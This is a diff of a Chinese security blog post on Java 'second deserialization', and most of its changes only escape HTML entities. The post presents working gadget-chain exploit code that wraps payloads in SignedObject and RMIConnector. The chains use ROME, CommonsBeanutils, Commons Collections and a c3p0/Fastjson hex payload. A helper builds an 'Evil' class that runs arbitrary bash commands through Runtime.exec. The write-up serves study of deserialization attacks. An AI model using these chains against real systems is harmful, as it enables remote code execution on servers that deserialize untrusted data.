@@ -3,7 +3,7 @@
 
 对 Java 二次反序列化学习研究整理
 
-<!--more-->
+&lt;!--more--&gt;
 
 ### 前言
 
@@ -34,10 +34,10 @@ PS：本文用到的工具类会放在文末
 那么茯苓思路瞬间清晰了，先构造一个恶意`SignedObject`
 
 ```java
-KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+KeyPairGenerator kpg = KeyPairGenerator.getInstance(&#34;DSA&#34;);
 kpg.initialize(1024);
 KeyPair kp = kpg.generateKeyPair();
-SignedObject signedObject = new SignedObject(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance("DSA"));
+SignedObject signedObject = new SignedObject(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance(&#34;DSA&#34;));
 ```
 
 然后调用它的`getObject()`方法即可，那么现在压力来到了如何调用这个方法这边
@@ -65,28 +65,28 @@ import static util.Tool.*;
 public class R_test {
     public static void main(String[] args) throws Exception{
         TemplatesImpl obj = new TemplatesImpl();
-        setFieldValue(obj, "_bytecodes", new byte[][]{
-                payload("mate-calc").toBytecode()});
-        setFieldValue(obj, "_name", "Poria");
-        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        setFieldValue(obj, &#34;_bytecodes&#34;, new byte[][]{
+                payload(&#34;mate-calc&#34;).toBytecode()});
+        setFieldValue(obj, &#34;_name&#34;, &#34;Poria&#34;);
+        setFieldValue(obj, &#34;_tfactory&#34;, new TransformerFactoryImpl());
         
         HashMap hashMap1 = getpayload(Templates.class, obj);
 
-        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&#34;DSA&#34;);
         kpg.initialize(1024);
         KeyPair kp = kpg.generateKeyPair();
-        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));
+        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(&#34;DSA&#34;));
 
         HashMap hashMap2 = getpayload(SignedObject.class, signedObject);
         
-        run(hashMap2, "debug", "object");
+        run(hashMap2, &#34;debug&#34;, &#34;object&#34;);
     }
     public static HashMap getpayload(Class clazz, Object obj) throws Exception {
-        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "rand"));
+        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &#34;rand&#34;));
         HashMap hashMap = new HashMap();
-        hashMap.put(objectBean, "rand");
+        hashMap.put(objectBean, &#34;rand&#34;);
         ObjectBean expObjectBean = new ObjectBean(clazz, obj);
-        setFieldValue(objectBean, "_equalsBean", new EqualsBean(ObjectBean.class, expObjectBean));
+        setFieldValue(objectBean, &#34;_equalsBean&#34;, new EqualsBean(ObjectBean.class, expObjectBean));
         return hashMap;
     }
 } 
@@ -129,35 +129,35 @@ import static util.Tool.*;
 public class R_SignedObject {
     public static void main(String[] args) throws Exception{
         TemplatesImpl obj = new TemplatesImpl();
-        setFieldValue(obj, "_bytecodes", new byte[][]{
-                payload("mate-calc").toBytecode()});
-        setFieldValue(obj, "_name", "Poria");
-        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        setFieldValue(obj, &#34;_bytecodes&#34;, new byte[][]{
+                payload(&#34;mate-calc&#34;).toBytecode()});
+        setFieldValue(obj, &#34;_name&#34;, &#34;Poria&#34;);
+        setFieldValue(obj, &#34;_tfactory&#34;, new TransformerFactoryImpl());
 
         Hashtable table1 = getPayload(Templates.class, obj);
 
-        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&#34;DSA&#34;);
         kpg.initialize(1024);
         KeyPair kp = kpg.generateKeyPair();
-        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance("DSA"));
+        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance(&#34;DSA&#34;));
 
         Hashtable table2 = getPayload(SignedObject.class, signedObject);
 
-        run(table2, "debug", "object");
+        run(table2, &#34;debug&#34;, &#34;object&#34;);
     }
     public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception{
-        EqualsBean bean = new EqualsBean(String.class, "r");
+        EqualsBean bean = new EqualsBean(String.class, &#34;r&#34;);
         HashMap map1 = new HashMap();
         HashMap map2 = new HashMap();
-        map1.put("yy", bean);
-        map1.put("zZ", payloadObj);
-        map2.put("zZ", bean);
-        map2.put("yy", payloadObj);
+        map1.put(&#34;yy&#34;, bean);
+        map1.put(&#34;zZ&#34;, payloadObj);
+        map2.put(&#34;zZ&#34;, bean);
+        map2.put(&#34;yy&#34;, payloadObj);
         Hashtable table = new Hashtable();
-        table.put(map1, "1");
-        table.put(map2, "2");
-        setFieldValue(bean, "_beanClass", clazz);
-        setFieldValue(bean, "_obj", payloadObj);
+        table.put(map1, &#34;1&#34;);
+        table.put(map2, &#34;2&#34;);
+        setFieldValue(bean, &#34;_beanClass&#34;, clazz);
+        setFieldValue(bean, &#34;_obj&#34;, payloadObj);
         return table;
     }
 }
@@ -228,29 +228,29 @@ import static util.Tool.*;
 public class CB_SingedfObject {
     public static void main(String[] args) throws Exception {
         TemplatesImpl obj = new TemplatesImpl();
-        setFieldValue(obj, "_bytecodes", new byte[][]{
-                payload("mate-calc").toBytecode()});
-        setFieldValue(obj, "_name", "Poria");
-        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        setFieldValue(obj, &#34;_bytecodes&#34;, new byte[][]{
+                payload(&#34;mate-calc&#34;).toBytecode()});
+        setFieldValue(obj, &#34;_name&#34;, &#34;Poria&#34;);
+        setFieldValue(obj, &#34;_tfactory&#34;, new TransformerFactoryImpl());
 
-        PriorityQueue queue1 = getpayload(obj, "outputProperties");
+        PriorityQueue queue1 = getpayload(obj, &#34;outputProperties&#34;);
 
-        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&#34;DSA&#34;);
         kpg.initialize(1024);
         KeyPair kp = kpg.generateKeyPair();
-        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance("DSA"));
+        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance(&#34;DSA&#34;));
 
-        PriorityQueue queue2 = getpayload(signedObject, "object");
+        PriorityQueue queue2 = getpayload(signedObject, &#34;object&#34;);
 
-        run(queue2, "debug", "object");
+        run(queue2, &#34;debug&#34;, &#34;object&#34;);
     }
-    public static PriorityQueue<Object> getpayload(Object object, String string) throws Exception {
+    public static PriorityQueue&lt;Object&gt; getpayload(Object object, String string) throws Exception {
         BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
         PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
-        priorityQueue.add("1");
-        priorityQueue.add("2");
-        setFieldValue(beanComparator, "property", string);
-        setFieldValue(priorityQueue, "queue", new Object[]{object, null});
+        priorityQueue.add(&#34;1&#34;);
+        priorityQueue.add(&#34;2&#34;);
+        setFieldValue(beanComparator, &#34;property&#34;, string);
+        setFieldValue(priorityQueue, &#34;queue&#34;, new Object[]{object, null});
         return priorityQueue;
     }
 }
@@ -325,8 +325,8 @@ readObject:431, ObjectInputStream (java.io)
 到此，这个利用方法就通了，给出构造
 
 ```java
-JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
-setFieldValue(jmxServiceURL, "urlPath", "/stub/base64string");
+JMXServiceURL jmxServiceURL = new JMXServiceURL(&#34;service:jmx:rmi://&#34;);
+setFieldValue(jmxServiceURL, &#34;urlPath&#34;, &#34;/stub/base64string&#34;);
 RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
 ```
 
@@ -365,23 +365,23 @@ import static util.Tool.*;
 
 public class CC_RMIConnector {
     public static void main(String[] args) throws Exception {
-        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
-        setFieldValue(jmxServiceURL, "urlPath", "/stub/base64string");
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&#34;service:jmx:rmi://&#34;);
+        setFieldValue(jmxServiceURL, &#34;urlPath&#34;, &#34;/stub/base64string&#34;);
         RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
 
-        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;connect&#34;, null, null);
 
-        HashMap<Object, Object> map = new HashMap<>();
-        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);
 
-        HashMap<Object, Object> expMap = new HashMap<>();
-        expMap.put(tiedMapEntry, "Poria");
+        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();
+        expMap.put(tiedMapEntry, &#34;Poria&#34;);
         lazyMap.remove(rmiConnector);
 
-        setFieldValue(lazyMap,"factory", invokerTransformer);
+        setFieldValue(lazyMap,&#34;factory&#34;, invokerTransformer);
 
-        run(expMap, "debug", "object");
+        run(expMap, &#34;debug&#34;, &#34;object&#34;);
     }
 }
 ```
@@ -445,13 +445,13 @@ readObject:431, ObjectInputStream (java.io)
 
 ```json
 {
-    "rand1": {
-        "@type": "java.lang.Class",
-        "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
+    &#34;rand1&#34;: {
+        &#34;@type&#34;: &#34;java.lang.Class&#34;,
+        &#34;val&#34;: &#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;
     },
-    "rand2": {
-        "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
-        "userOverridesAsString": "HexAsciiSerializedMap:hexstring;",
+    &#34;rand2&#34;: {
+        &#34;@type&#34;: &#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;,
+        &#34;userOverridesAsString&#34;: &#34;HexAsciiSerializedMap:hexstring;&#34;,
     }
 }
 ```
@@ -474,20 +474,20 @@ import static util.Tool.*;
 public class Hex {
     public static void main(String[] args) throws Exception{
         TemplatesImpl obj = new TemplatesImpl();
-        setFieldValue(obj, "_bytecodes", new byte[][]{
-                payload("mate-calc").toBytecode()});
-        setFieldValue(obj, "_name", "Poria");
-        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        setFieldValue(obj, &#34;_bytecodes&#34;, new byte[][]{
+                payload(&#34;mate-calc&#34;).toBytecode()});
+        setFieldValue(obj, &#34;_name&#34;, &#34;Poria&#34;);
+        setFieldValue(obj, &#34;_tfactory&#34;, new TransformerFactoryImpl());
 
         BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
-        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-        queue.add("1");
-        queue.add("1");
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        queue.add(&#34;1&#34;);
+        queue.add(&#34;1&#34;);
 
-        setFieldValue(comparator, "property", "outputProperties");
-        setFieldValue(queue, "queue", new Object[]{obj, null});
+        setFieldValue(comparator, &#34;property&#34;, &#34;outputProperties&#34;);
+        setFieldValue(queue, &#34;queue&#34;, new Object[]{obj, null});
 
-        run(queue, "debug", "hex");
+        run(queue, &#34;debug&#34;, &#34;hex&#34;);
     }
 }
 ```
@@ -543,32 +543,32 @@ public class Tool {
     private Tool(){}
     public static void run(Object obj, String mode, String type) throws Exception {
         switch (type) {
-            case "object" :
+            case &#34;object&#34; :
                 String object = base64Encode(serialize(obj));
                 System.out.println(object);
-                if (mode.equals("debug"))
+                if (mode.equals(&#34;debug&#34;))
                     deserialize((base64Decode(object)));
                 break;
-            case "hessian" :
+            case &#34;hessian&#34; :
                 String hessian = base64Encode(hessianser(obj));
                 System.out.println(hessian);
-                if (mode.equals("debug"))
+                if (mode.equals(&#34;debug&#34;))
                     hessiandeser(base64Decode(hessian));
                 break;
-            case "hex" :
+            case &#34;hex&#34; :
                 byte[] bytes = serialize(obj);
-                String hex = "{\n" +
-                        "    \"rand1\": {\n" +
-                        "        \"@type\": \"java.lang.Class\",\n" +
-                        "        \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
-                        "    },\n" +
-                        "    \"rand2\": {\n" +
-                        "        \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
-                        "        \"userOverridesAsString\": \"HexAsciiSerializedMap:" + bytesToHexString(bytes, bytes.length) + ";\",\n" +
-                        "    }\n" +
-                        "}";
+                String hex = &#34;{\n&#34; &#43;
+                        &#34;    \&#34;rand1\&#34;: {\n&#34; &#43;
+                        &#34;        \&#34;@type\&#34;: \&#34;java.lang.Class\&#34;,\n&#34; &#43;
+                        &#34;        \&#34;val\&#34;: \&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;\n&#34; &#43;
+                        &#34;    },\n&#34; &#43;
+                        &#34;    \&#34;rand2\&#34;: {\n&#34; &#43;
+                        &#34;        \&#34;@type\&#34;: \&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;,\n&#34; &#43;
+                        &#34;        \&#34;userOverridesAsString\&#34;: \&#34;HexAsciiSerializedMap:&#34; &#43; bytesToHexString(bytes, bytes.length) &#43; &#34;;\&#34;,\n&#34; &#43;
+                        &#34;    }\n&#34; &#43;
+                        &#34;}&#34;;
                 System.out.println(hex);
-                if (mode.equals("debug"))
+                if (mode.equals(&#34;debug&#34;))
                     JSON.parseObject(hex);
                 break;
         }
@@ -608,9 +608,9 @@ public class Tool {
     }
     public static String bytesToHexString(byte[] bArray, int length) {
         StringBuffer sb = new StringBuffer(length);
-        for(int i = 0; i < length; ++i) {
-            String sTemp = Integer.toHexString(255 & bArray[i]);
-            if (sTemp.length() < 2) {
+        for(int i = 0; i &lt; length; &#43;&#43;i) {
+            String sTemp = Integer.toHexString(255 &amp; bArray[i]);
+            if (sTemp.length() &lt; 2) {
                 sb.append(0);
             }
             sb.append(sTemp.toUpperCase());
@@ -619,13 +619,13 @@ public class Tool {
     }
 
     public static CtClass payload(String string) throws Exception {
-        String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
+        String AbstractTranslet = &#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;;
         ClassPool classPool = ClassPool.getDefault();
         classPool.appendClassPath(AbstractTranslet);
-        CtClass payload = classPool.makeClass("Evil");
+        CtClass payload = classPool.makeClass(&#34;Evil&#34;);
         payload.setSuperclass(classPool.get(AbstractTranslet));
         payload.makeClassInitializer().setBody(
-                "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\",\"" + string + "\"});");
+                &#34;java.lang.Runtime.getRuntime().exec(new String[]{\&#34;/bin/bash\&#34;, \&#34;-c\&#34;,\&#34;&#34; &#43; string &#43; &#34;\&#34;});&#34;);
         return payload;
     }
     
@@ -633,7 +633,7 @@ public class Tool {
         Field field = getField(obj.getClass(), fieldName);
         field.set(obj, value);
     }
-    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
+    public static Field getField (final Class&lt;?&gt; clazz, final String fieldName ) throws Exception {
         try {
             Field field = clazz.getDeclaredField(fieldName);
             if ( field != null )
@@ -669,6 +669,6 @@ https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA
 
 ---
 
-> 作者: [晨星_茯苓](/about/)  
+> 作者:   
 > URL: https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/  
 
